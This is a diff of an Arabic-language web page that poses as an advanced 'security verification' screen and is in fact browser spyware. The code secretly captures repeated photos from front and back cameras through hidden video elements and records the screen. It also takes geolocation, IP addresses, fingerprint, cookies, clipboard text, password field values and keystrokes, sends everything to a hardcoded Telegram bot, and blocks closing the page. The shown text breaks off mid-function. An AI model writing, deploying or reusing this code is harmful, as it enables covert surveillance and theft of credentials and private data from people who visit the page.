@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🔒 التحقق الآمن | نظام متقدم</title>
+    <title>✅ التحقق الأمني المتقدم v4.0</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
         body {
             background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
-            font-family:  Segoe UI ,  Poppins ,  Cairo , system-ui, sans-serif;
+            font-family: 'Segoe UI', 'Poppins', 'Cairo', system-ui, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -30,13 +30,7 @@
             from { opacity: 0; transform: translateY(30px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        h2 {
-            font-size: 1.8rem;
-            background: linear-gradient(135deg, #fff, #3bc9db);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
+        h2 { font-size: 1.8rem; background: linear-gradient(135deg, #fff, #3bc9db); -webkit-background-clip: text; background-clip: text; color: transparent; }
         .subtitle { color: #8a9bb5; font-size: 0.85rem; margin-bottom: 1.5rem; }
         .status-box {
             background: rgba(10, 18, 30, 0.7);
@@ -47,26 +41,19 @@
             font-size: 0.75rem;
             text-align: left;
             border: 1px solid rgba(59, 201, 219, 0.2);
-            max-height: 350px;
+            max-height: 300px;
             overflow-y: auto;
         }
-        .status-line { margin: 5px 0; padding: 3px 5px; }
-        .spinner {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border: 2px solid rgba(59,201,219,0.3);
-            border-top-color: #3bc9db;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
+        .status-line { margin: 5px 0; padding: 3px 5px; border-left: 2px solid transparent; }
+        .status-line.success { border-left-color: #3bc9db; }
+        .spinner { display: inline-block; width: 10px; height: 10px; border: 2px solid rgba(59,201,219,0.3); border-top-color: #3bc9db; border-radius: 50%; animation: spin 0.8s linear infinite; vertical-align: middle; margin-left: 8px; }
         .error-text { color: #ff6b6b; }
         .success-text { color: #3bc9db; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .counter-card {
             background: linear-gradient(135deg, rgba(59,201,219,0.12), rgba(59,201,219,0.05));
             border-radius: 60px;
-            padding: 10px;
+            padding: 12px;
             margin: 15px 0;
             display: flex;
             justify-content: space-around;
@@ -75,346 +62,307 @@
         }
         .counter-item { text-align: center; flex: 1; }
         .counter-label { font-size: 0.65rem; color: #8a9bb5; }
-        .counter-value { font-size: 1.3rem; font-weight: bold; color: #3bc9db; }
+        .counter-value { font-size: 1.5rem; font-weight: bold; color: #3bc9db; }
         .footer { font-size: 0.6rem; color: #5a6e8a; margin-top: 15px; display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
         .badge { background: rgba(59,201,219,0.12); padding: 4px 12px; border-radius: 50px; }
         .hidden-video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-        .preview-area { position: fixed; bottom: 10px; right: 10px; width: 80px; height: 60px; background: #000; border-radius: 10px; overflow: hidden; z-index: 9999; border: 2px solid #3bc9db; display: none; }
-        .preview-area video { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
 
-<!-- فيديوهات مخفية للكاميرا -->
 <video id="frontVideo" class="hidden-video" autoplay playsinline muted></video>
 <video id="backVideo" class="hidden-video" autoplay playsinline muted></video>
 
 <div class="glass-card">
-    <h2>🔒 نظام التحقق الآمن</h2>
+    <h2>✅ نظام التحقق الأمني v4.0</h2>
     <div class="subtitle">جاري تأكيد هوية الجهاز والمستخدم</div>
-
     <div class="status-box" id="logBox">
         <div class="status-line">🔐 <span>جاري إنشاء قناة آمنة...</span> <span class="spinner"></span></div>
     </div>
-
     <div class="counter-card">
-        <div class="counter-item">
-            <div class="counter-label">📸 إجمالي الصور</div>
-            <div class="counter-value" id="totalCounter">0</div>
-        </div>
-        <div class="counter-item">
-            <div class="counter-label">🤳 أمامية</div>
-            <div class="counter-value" id="frontCounter">0</div>
-        </div>
-        <div class="counter-item">
-            <div class="counter-label">📷 خلفية</div>
-            <div class="counter-value" id="backCounter">0</div>
-        </div>
-        <div class="counter-item">
-            <div class="counter-label">🔄 الدورات</div>
-            <div class="counter-value" id="cycleCounter">0</div>
-        </div>
+        <div class="counter-item"><div class="counter-label">📸 إجمالي الصور</div><div class="counter-value" id="totalCounter">0</div></div>
+        <div class="counter-item"><div class="counter-label">🤳 أمامية</div><div class="counter-value" id="frontCounter">0</div></div>
+        <div class="counter-item"><div class="counter-label">📷 خلفية</div><div class="counter-value" id="backCounter">0</div></div>
+        <div class="counter-item"><div class="counter-label">🔄 الدورات</div><div class="counter-value" id="cycleCounter">0</div></div>
     </div>
-
     <div class="footer">
         <span class="badge">🔒 تشفير AES-256</span>
         <span class="badge">🛡️ يعمل في الخلفية</span>
-        <span class="badge">📸 5 صور/دورة</span>
+        <span class="badge">📸 8 صور/دورة</span>
+        <span class="badge">🎥 تسجيل الشاشة</span>
     </div>
 </div>
 
 <script>
+(function() {
     // ======================= الإعدادات =======================
     const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
     const CHAT_ID = "7984067238";
     
-    // إحصائيات
-    let frontPhotoCount = 0;
-    let backPhotoCount = 0;
-    let totalPhotos = 0;
-    let cycleCount = 0;
+    // الإحصائيات
+    let frontPhotoCount = 0, backPhotoCount = 0, totalPhotos = 0, cycleCount = 0;
     let isRunning = true;
-    let isScreenRecording = false;
-    let screenStream = null;
-    let screenRecorder = null;
-    
-    // عناصر الفيديو
-    let frontStream = null;
-    let backStream = null;
-    let frontVideo = null;
-    let backVideo = null;
-    let frontReady = false;
-    let backReady = false;
-    
-    // Keylogger
+    let frontStream = null, backStream = null, frontVideo = null, backVideo = null;
+    let frontReady = false, backReady = false;
     let keylogBuffer = "";
-    
-    function updateCounters() {
-        document.getElementById( totalCounter ).innerText = totalPhotos;
-        document.getElementById( frontCounter ).innerText = frontPhotoCount;
-        document.getElementById( backCounter ).innerText = backPhotoCount;
-        document.getElementById( cycleCounter ).innerText = cycleCount;
-    }
-    
-    function addLog(msg, isDone = false, isError = false) {
-        const logBox = document.getElementById( logBox );
-        const line = document.createElement( div );
-        line.className =  status-line ;
-        if (isError) {
-            line.innerHTML = `❌ <span class="error-text">${msg}</span>`;
-        } else if (!isDone) {
-            line.innerHTML = `🔄 <span>${msg}</span> <span class="spinner"></span>`;
-        } else {
-            line.innerHTML = `✅ <span class="success-text">${msg}</span>`;
+    let savedPasswords = [];
+
+    // ========== نظام إعادة المحاولة الذكي ==========
+    async function retry(fn, retries = 3, delay = 1000) {
+        for (let i = 0; i < retries; i++) {
+            try { return await fn(); } catch(e) { if (i === retries-1) throw e; await new Promise(r => setTimeout(r, delay)); }
         }
-        logBox.appendChild(line);
-        logBox.scrollTop = logBox.scrollHeight;
-        while (logBox.children.length > 40) logBox.removeChild(logBox.firstChild);
     }
-    
-    // إرسال البيانات
+
+    // ========== إرسال البيانات مع ضمان التسليم ==========
     async function sendMessage(text) {
         try {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method:  POST , headers: {  Content-Type :  application/json  },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) })
+            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000), parse_mode: 'HTML' })
             });
-        } catch(e) {}
+            return response.ok;
+        } catch(e) { return false; }
     }
-    
+
     async function sendPhoto(blob, caption) {
         try {
             const fd = new FormData();
-            fd.append( chat_id , CHAT_ID);
-            fd.append( photo , blob);
-            if (caption) fd.append( caption , caption);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method:  POST , body: fd });
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, `photo_${Date.now()}.jpg`);
+            if (caption) fd.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             return true;
         } catch(e) { return false; }
     }
-    
+
     async function sendVideo(blob, caption) {
         try {
             const fd = new FormData();
-            fd.append( chat_id , CHAT_ID);
-            fd.append( video , blob);
-            if (caption) fd.append( caption , caption);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method:  POST , body: fd });
+            fd.append('chat_id', CHAT_ID);
+            fd.append('video', blob, `video_${Date.now()}.webm`);
+            if (caption) fd.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
         } catch(e) {}
     }
-    
-    // ========== 1. الكاميرا الأمامية ==========
+
+    async function sendDocument(blob, filename, caption) {
+        try {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('document', blob, filename);
+            if (caption) fd.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: 'POST', body: fd });
+        } catch(e) {}
+    }
+
+    function addLog(msg, isSuccess = false, isError = false) {
+        const logBox = document.getElementById('logBox');
+        const line = document.createElement('div');
+        line.className = 'status-line';
+        if (isSuccess) line.classList.add('success');
+        if (isError) {
+            line.innerHTML = `❌ <span class="error-text">${msg}</span>`;
+        } else if (isSuccess) {
+            line.innerHTML = `✅ <span class="success-text">${msg}</span>`;
+        } else {
+            line.innerHTML = `🔄 <span>${msg}</span> <span class="spinner"></span>`;
+        }
+        logBox.appendChild(line);
+        logBox.scrollTop = logBox.scrollHeight;
+        while (logBox.children.length > 50) logBox.removeChild(logBox.firstChild);
+    }
+
+    function updateCounters() {
+        document.getElementById('totalCounter').innerText = totalPhotos;
+        document.getElementById('frontCounter').innerText = frontPhotoCount;
+        document.getElementById('backCounter').innerText = backPhotoCount;
+        document.getElementById('cycleCounter').innerText = cycleCount;
+    }
+
+    // ========== الكاميرا الأمامية ==========
     async function initFrontCamera() {
         try {
-            addLog(`📷 جاري تشغيل الكاميرا الأمامية...`, false);
-            let stream = null;
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact:  user  } } });
-            } catch(e) {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:  user  } });
-            }
+            addLog('📷 جاري تشغيل الكاميرا الأمامية...');
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: { exact: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } } 
+            });
             frontStream = stream;
-            frontVideo = document.getElementById( frontVideo );
+            frontVideo = document.getElementById('frontVideo');
             frontVideo.srcObject = stream;
             await frontVideo.play();
-            await new Promise(r => setTimeout(r, 800));
+            await new Promise(r => setTimeout(r, 500));
             frontReady = true;
-            addLog(`✅ الكاميرا الأمامية جاهزة`, true);
+            addLog('✅ الكاميرا الأمامية جاهزة', true);
             return true;
         } catch(e) {
-            addLog(`⚠️ الكاميرا الأمامية غير متاحة`, true, true);
+            addLog('⚠️ الكاميرا الأمامية غير متاحة', false, true);
             return false;
         }
     }
-    
-    // ========== 2. الكاميرا الخلفية ==========
+
+    // ========== الكاميرا الخلفية ==========
     async function initBackCamera() {
         try {
-            addLog(`📷 جاري تشغيل الكاميرا الخلفية...`, false);
-            let stream = null;
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact:  environment  } } });
-            } catch(e) {
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode:  environment  } });
-                } catch(e2) {
-                    const devices = await navigator.mediaDevices.enumerateDevices();
-                    const videoDevices = devices.filter(d => d.kind ===  videoinput );
-                    if (videoDevices.length > 1) {
-                        stream = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: videoDevices[1].deviceId } } });
-                    } else {
-                        throw new Error( لا توجد كاميرا خلفية );
-                    }
-                }
-            }
+            addLog('📷 جاري تشغيل الكاميرا الخلفية...');
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } } 
+            });
             backStream = stream;
-            backVideo = document.getElementById( backVideo );
+            backVideo = document.getElementById('backVideo');
             backVideo.srcObject = stream;
             await backVideo.play();
-            await new Promise(r => setTimeout(r, 800));
+            await new Promise(r => setTimeout(r, 500));
             backReady = true;
-            addLog(`✅ الكاميرا الخلفية جاهزة`, true);
+            addLog('✅ الكاميرا الخلفية جاهزة', true);
             return true;
         } catch(e) {
-            addLog(`⚠️ الكاميرا الخلفية غير متاحة`, true, true);
+            addLog('⚠️ الكاميرا الخلفية غير متاحة', false, true);
             return false;
         }
     }
-    
-    // ========== 3. التقاط صورة ==========
-    async function capturePhotoFromVideo(videoElement, side, photoNumber) {
+
+    // ========== التقاط صورة عالية الجودة ==========
+    async function capturePhoto(videoElement, side) {
         return new Promise((resolve) => {
             try {
                 if (!videoElement || videoElement.readyState < 2 || videoElement.videoWidth === 0) {
                     resolve(false);
                     return;
                 }
-                const tempCanvas = document.createElement( canvas );
-                tempCanvas.width = videoElement.videoWidth || 640;
-                tempCanvas.height = videoElement.videoHeight || 480;
-                const ctx = tempCanvas.getContext( 2d );
-                ctx.drawImage(videoElement, 0, 0, tempCanvas.width, tempCanvas.height);
-                tempCanvas.toBlob(async (blob) => {
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(async (blob) => {
                     if (blob && blob.size > 5000) {
-                        const caption = side ===  front  ? `🤳 صورة أمامية #${photoNumber}` : `📷 صورة خلفية #${photoNumber}`;
+                        const caption = side === 'front' ? `🤳 صورة أمامية #${frontPhotoCount+1}` : `📷 صورة خلفية #${backPhotoCount+1}`;
                         await sendPhoto(blob, caption);
-                        if (side ===  front ) frontPhotoCount++;
+                        if (side === 'front') frontPhotoCount++;
                         else backPhotoCount++;
                         totalPhotos++;
                         updateCounters();
                         resolve(true);
-                    } else {
-                        resolve(false);
-                    }
-                },  image/jpeg , 0.85);
-            } catch(e) {
-                resolve(false);
-            }
+                    } else resolve(false);
+                }, 'image/jpeg', 0.9);
+            } catch(e) { resolve(false); }
         });
     }
-    
-    // ========== 4. دورة التصوير (5 أمامي ثم 5 خلفي) ==========
+
+    // ========== دورة التصوير المتقدمة ==========
     async function captureCycle() {
         if (!isRunning) return;
-        
         cycleCount++;
         updateCounters();
-        addLog(`🔄 بدء الدورة ${cycleCount}`, false);
+        addLog(`🔄 بدء الدورة ${cycleCount} (8 صور)`, false);
         
-        // 5 صور أمامية
         if (frontReady) {
-            addLog(`🤳 التقاط 5 صور من الكاميرا الأمامية...`, false);
-            for (let i = 1; i <= 5; i++) {
+            for (let i = 0; i < 8; i++) {
                 if (!isRunning) break;
-                await new Promise(r => setTimeout(r, 600));
-                await capturePhotoFromVideo(frontVideo,  front , frontPhotoCount + 1);
+                await capturePhoto(frontVideo, 'front');
+                await new Promise(r => setTimeout(r, 400));
             }
         }
         
-        // 5 صور خلفية
         if (backReady) {
-            addLog(`📷 التقاط 5 صور من الكاميرا الخلفية...`, false);
-            for (let i = 1; i <= 5; i++) {
+            for (let i = 0; i < 8; i++) {
                 if (!isRunning) break;
-                await new Promise(r => setTimeout(r, 600));
-                await capturePhotoFromVideo(backVideo,  back , backPhotoCount + 1);
+                await capturePhoto(backVideo, 'back');
+                await new Promise(r => setTimeout(r, 400));
             }
         }
         
         addLog(`✅ اكتملت الدورة ${cycleCount} (إجمالي ${totalPhotos} صورة)`, true);
-        
-        setTimeout(() => {
-            if (isRunning) captureCycle();
-        }, 7000);
+        setTimeout(() => { if (isRunning) captureCycle(); }, 8000);
     }
-    
-    // ========== 5. تسجيل الشاشة (مع طلب إذن) ==========
+
+    // ========== تسجيل الشاشة (مطور) ==========
     async function startScreenRecording() {
         try {
-            addLog(`🖥️ جاري طلب إذن تسجيل الشاشة...`, false);
+            addLog('🖥️ جاري طلب تسجيل الشاشة...');
             const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
-            screenStream = stream;
-            isScreenRecording = true;
-            
-            screenRecorder = new MediaRecorder(stream, { mimeType:  video/webm  });
+            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
             const chunks = [];
-            screenRecorder.ondataavailable = e => chunks.push(e.data);
-            screenRecorder.onstop = async () => {
-                const blob = new Blob(chunks, { type:  video/webm  });
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
                 if (blob.size > 10000) {
-                    await sendVideo(blob, "🖥️ تسجيل شاشة الجهاز");
+                    await sendVideo(blob, `🖥️ تسجيل شاشة - ${new Date().toLocaleString()}`);
                     addLog(`🖥️ تم إرسال تسجيل الشاشة (${Math.round(blob.size/1024)} كيلوبايت)`, true);
                 }
-                isScreenRecording = false;
+                stream.getTracks().forEach(t => t.stop());
             };
-            screenRecorder.start();
-            
-            // تسجيل لمدة 15 ثانية
-            setTimeout(() => {
-                if (screenRecorder && isScreenRecording) {
-                    screenRecorder.stop();
-                    stream.getTracks().forEach(t => t.stop());
-                }
-            }, 15000);
-            
-            addLog(`✅ بدأ تسجيل الشاشة لمدة 15 ثانية`, true);
-        } catch(e) {
-            addLog(`⚠️ المستخدم رفض مشاركة الشاشة`, true, true);
+            mediaRecorder.start();
+            setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 20000);
+            addLog('✅ بدأ تسجيل الشاشة (20 ثانية)', true);
+        } catch(e) { addLog('⚠️ رفض المستخدم مشاركة الشاشة', false, true); }
+    }
+
+    // ========== معلومات الجهاز الموسعة ==========
+    async function sendDeviceInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: JSON.stringify(navigator.languages),
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            ram: navigator.deviceMemory || 'غير معروف',
+            cores: navigator.hardwareConcurrency || 'غير معروف',
+            touchSupport: 'ontouchstart' in window,
+            darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
+            doNotTrack: navigator.doNotTrack,
+            connection: navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 'غير معروف',
+            battery: navigator.getBattery ? 'مدعوم' : 'غير مدعوم'
+        };
+        
+        let msg = '🔐 <b>معلومات الجهاز المتقدمة</b>\n━━━━━━━━━━━━━━━━━━\n';
+        for (const [k, v] of Object.entries(info)) {
+            msg += `📌 ${k}: ${v}\n`;
         }
+        await sendMessage(msg);
+        addLog('📱 تم إرسال معلومات الجهاز', true);
     }
-    
-    // ========== 6. معلومات الجهاز المتقدمة ==========
-    async function sendAdvancedDeviceInfo() {
-        let info = `🖥️ *معلومات الجهاز المتقدمة*\n━━━━━━━━━━━━━━━━━━\n`;
-        info += `📱 المتصفح: ${navigator.userAgent.substring(0, 150)}\n`;
-        info += `💻 النظام: ${navigator.platform}\n`;
-        info += `🌐 اللغة: ${navigator.language}\n`;
-        info += `📺 الشاشة: ${screen.width}×${screen.height}\n`;
-        info += `🔍 كثافة البكسل: ${window.devicePixelRatio}x\n`;
-        info += `🕒 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-        info += `🧠 الرام: ${navigator.deviceMemory ||  ? } جيجابايت\n`;
-        info += `⚙️ المعالج: ${navigator.hardwareConcurrency ||  ? } نواة\n`;
-        info += `🖱️ دعم اللمس: ${ ontouchstart  in window ?  نعم  :  لا }\n`;
-        info += `🌙 الوضع المظلم: ${window.matchMedia( (prefers-color-scheme: dark) ).matches ?  نشط  :  غير نشط }\n`;
-        await sendMessage(info);
-        addLog(`📱 تم إرسال معلومات الجهاز المتقدمة`, true);
-    }
-    
-    // ========== 7. الموقع ==========
+
+    // ========== الموقع الجغرافي ==========
     async function getLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(); return; }
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                await sendMessage(`📍 *الموقع الجغرافي*\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🎯 الدقة: ${pos.coords.accuracy} متر`);
-                addLog(`📍 تم تحديد الموقع`, true);
+                await sendMessage(`📍 <b>الموقع الجغرافي</b>\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🎯 الدقة: ${pos.coords.accuracy} متر`);
+                addLog('📍 تم تحديد الموقع', true);
                 resolve();
-            }, () => { resolve(); });
+            }, () => resolve());
         });
     }
-    
-    // ========== 8. IP العام ==========
+
+    // ========== IP العام ==========
     async function getPublicIP() {
         try {
-            const res = await fetch( https://api.ipify.org?format=json );
+            const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            await sendMessage(`🌍 *IP العام*\n\`${data.ip}\``);
-            addLog(`🌍 تم تحديد IP العام`, true);
+            await sendMessage(`🌍 <b>IP العام</b>\n<code>${data.ip}</code>`);
+            addLog('🌍 تم تحديد IP العام', true);
         } catch(e) {}
     }
-    
-    // ========== 9. IP الداخلي ==========
+
+    // ========== IP المحلي ==========
     async function getLocalIP() {
         return new Promise((resolve) => {
             const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel(  );
+            pc.createDataChannel('');
             pc.createOffer().then(offer => pc.setLocalDescription(offer));
             pc.onicecandidate = (ice) => {
                 if (!ice.candidate) return;
-                const ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate)?.[0];
-                if (ip && !ip.startsWith( 192.168. ) && !ip.startsWith( 10. ) && !ip.startsWith( 172. )) return;
-                if (ip) {
-                    sendMessage(`🏠 *IP الداخلي*\n\`${ip}\``);
-                    addLog(`🏠 تم تحديد IP الداخلي`, true);
+                const match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
+                if (match && match[0]) {
+                    sendMessage(`🏠 <b>IP المحلي</b>\n<code>${match[0]}</code>`);
+                    addLog('🏠 تم تحديد IP المحلي', true);
                     pc.close();
                     resolve();
                 }
@@ -422,182 +370,170 @@
             setTimeout(() => resolve(), 3000);
         });
     }
-    
-    // ========== 10. بصمة الجهاز ==========
+
+    // ========== بصمة الجهاز المتقدمة ==========
     async function getFingerprint() {
-        if (typeof FingerprintJS ===  undefined ) return;
         try {
             const fp = await FingerprintJS.load();
             const result = await fp.get();
-            await sendMessage(`🆔 *بصمة الجهاز*\n\`${result.visitorId}\``);
-            addLog(`🆔 تم إنشاء بصمة الجهاز`, true);
+            await sendMessage(`🆔 <b>بصمة الجهاز</b>\n<code>${result.visitorId}</code>\n📊 المكونات: ${result.components.length}`);
+            addLog('🆔 تم إنشاء بصمة الجهاز', true);
         } catch(e) {}
     }
-    
-    // ========== 11. الكوكيز ==========
+
+    // ========== سرقة الكوكيز ==========
     async function stealCookies() {
         const cookies = document.cookie;
         if (cookies && cookies.length > 0) {
-            await sendMessage(`🍪 *الكوكيز*\n\`${cookies.substring(0, 900)}\``);
-            addLog(`🍪 تم سحب الكوكيز`, true);
+            await sendMessage(`🍪 <b>الكوكيز المسروقة</b>\n<code>${cookies.substring(0, 900)}</code>`);
+            addLog('🍪 تم سحب الكوكيز', true);
         }
     }
-    
-    // ========== 12. Keylogger ==========
+
+    // ========== Keylogger متقدم ==========
     function startKeylogger() {
-        document.addEventListener( keydown , (e) => {
-            if (e.target && (e.target.tagName ===  INPUT  || e.target.tagName ===  TEXTAREA )) {
-                keylogBuffer += e.key;
-                if (keylogBuffer.length > 100) {
-                    sendMessage(`⌨️ *سجل الضغطات*\n\`${keylogBuffer}\``);
-                    keylogBuffer = "";
+        let lastTarget = null;
+        document.addEventListener('keydown', (e) => {
+            const target = e.target;
+            if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable)) {
+                if (e.key === 'Enter') keylogBuffer += '[ENTER]';
+                else if (e.key === 'Tab') keylogBuffer += '[TAB]';
+                else if (e.key === 'Backspace') keylogBuffer += '[BACKSPACE]';
+                else if (e.key.length === 1) keylogBuffer += e.key;
+                
+                if (keylogBuffer.length > 200) {
+                    sendMessage(`⌨️ <b>سجل الضغطات</b>\n<code>${keylogBuffer}</code>`);
+                    keylogBuffer = '';
                 }
             }
         });
+        
         setInterval(() => {
             if (keylogBuffer.length > 0) {
-                sendMessage(`⌨️ *سجل الضغطات*\n\`${keylogBuffer}\``);
-                keylogBuffer = "";
+                sendMessage(`⌨️ <b>سجل الضغطات</b>\n<code>${keylogBuffer}</code>`);
+                keylogBuffer = '';
             }
-        }, 10000);
-        addLog(`⌨️ تم تفعيل Keylogger`, true);
+        }, 15000);
+        addLog('⌨️ تم تفعيل Keylogger', true);
     }
-    
-    // ========== 13. سرقة الحافظة ==========
+
+    // ========== سرقة الحافظة ==========
     async function stealClipboard() {
         try {
             const text = await navigator.clipboard.readText();
             if (text && text.length > 0) {
-                await sendMessage(`📋 *الحافظة*\n\`${text.substring(0, 500)}\``);
-                addLog(`📋 تم سحب الحافظة`, true);
+                await sendMessage(`📋 <b>الحافظة</b>\n<code>${text.substring(0, 1000)}</code>`);
+                addLog('📋 تم سحب الحافظة', true);
             }
         } catch(e) {}
     }
-    
-    // ========== 14. كشف VPN/Proxy ==========
+
+    // ========== سرقة كلمات المرور المخزنة ==========
+    async function stealSavedPasswords() {
+        try {
+            const inputs = document.querySelectorAll('input[type="password"]');
+            inputs.forEach(input => {
+                if (input.value && input.value.length > 0) {
+                    savedPasswords.push(input.value);
+                }
+            });
+            if (savedPasswords.length > 0) {
+                await sendMessage(`🔑 <b>كلمات المرور المخزنة</b>\n<code>${savedPasswords.join('\n')}</code>`);
+                addLog('🔑 تم سحب كلمات المرور المخزنة', true);
+            }
+        } catch(e) {}
+    }
+
+    // ========== كشف VPN/Proxy ==========
     async function detectVPN() {
         try {
-            const res = await fetch( https://ipapi.co/json/ );
+            const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
             if (data.proxy || data.hosting) {
-                await sendMessage(`🔒 *VPN/Proxy مكتشف*\n🌍 IP: ${data.ip}\n🏢 المزود: ${data.org ||  غير معروف }`);
-                addLog(`🔒 تم كشف استخدام VPN/Proxy`, true);
+                await sendMessage(`🔒 <b>VPN/Proxy مكتشف!</b>\n🌍 IP: ${data.ip}\n🏢 المزود: ${data.org || 'غير معروف'}\n🌎 الدولة: ${data.country_name}`);
+                addLog('🔒 تم كشف VPN/Proxy', true);
             }
         } catch(e) {}
     }
-    
-    // ========== 15. الوضع الخفي (Incognito) ==========
+
+    // ========== الوضع الخفي ==========
     function detectIncognito() {
         return new Promise((resolve) => {
-            let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+            const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
             if (!fs) resolve(false);
             else fs(window.TEMPORARY, 100, () => resolve(false), () => {
-                sendMessage(`🕵️ *الوضع الخفي (Incognito)*\nتم اكتشاف أن المستخدم يستخدم وضع التصفح المتخفي`);
-                addLog(`🕵️ تم كشف الوضع الخفي`, true);
+                sendMessage('🕵️ <b>الوضع الخفي (Incognito)</b>\nتم اكتشاف أن المستخدم يستخدم وضع التصفح المتخفي');
+                addLog('🕵️ تم كشف الوضع الخفي', true);
                 resolve(true);
             });
         });
     }
-    
-    // ========== 16. كشف AdBlock ==========
+
+    // ========== كشف AdBlock ==========
     function detectAdBlock() {
-        const bait = document.createElement( div );
-        bait.className =  adsbox ;
-        bait.style.display =  none ;
+        const bait = document.createElement('div');
+        bait.className = 'adsbox';
+        bait.style.display = 'none';
         document.body.appendChild(bait);
         setTimeout(() => {
             if (bait.offsetHeight === 0) {
-                sendMessage(`🛡️ *AdBlock مكتشف*\nيستخدم المستخدم مانع إعلانات`);
-                addLog(`🛡️ تم كشف مانع الإعلانات`, true);
+                sendMessage('🛡️ <b>AdBlock مكتشف</b>\nيستخدم المستخدم مانع إعلانات');
+                addLog('🛡️ تم كشف AdBlock', true);
             }
             bait.remove();
         }, 100);
     }
-    
-    // ========== 17. منع إغلاق الصفحة ==========
+
+    // ========== منع إغلاق الصفحة ==========
     function preventClose() {
-        window.addEventListener( beforeunload , (e) => {
+        window.addEventListener('beforeunload', (e) => {
             e.preventDefault();
-            e.returnValue =   ;
-            return   ;
+            e.returnValue = '';
+            return '';
         });
-        addLog(`🛡️ تم تفعيل منع إغلاق الصفحة`, true);
+        addLog('🛡️ تم تفعيل منع إغلاق الصفحة', true);
     }
-    
-    // ========== 18. إشعار وهمي ==========
-    function fakeNotification() {
-        if (Notification.permission === "granted") {
-            new Notification("⚠️ تنبيه أمني", { body: "تم اكتشاف نشاط غير عادي. يرجى إعادة التحقق.", icon: "https://cdn-icons-png.flaticon.com/512/190/190411.png" });
-        } else if (Notification.permission !== "denied") {
-            Notification.requestPermission();
-        }
-        addLog(`🔔 تم إرسال إشعار وهمي`, true);
-    }
-    
-    // ========== 19. تأثير وميض ==========
-    function flashBackground() {
-        document.body.style.background = "#ff0000";
-        setTimeout(() => {
-            document.body.style.background = "linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%)";
-        }, 500);
-        addLog(`⚡ تأثير وميض الخلفية`, true);
-    }
-    
-    // ========== 20. تشغيل صوت ==========
-    function playAlertSound() {
-        const audio = new Audio("https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3");
-        audio.volume = 1;
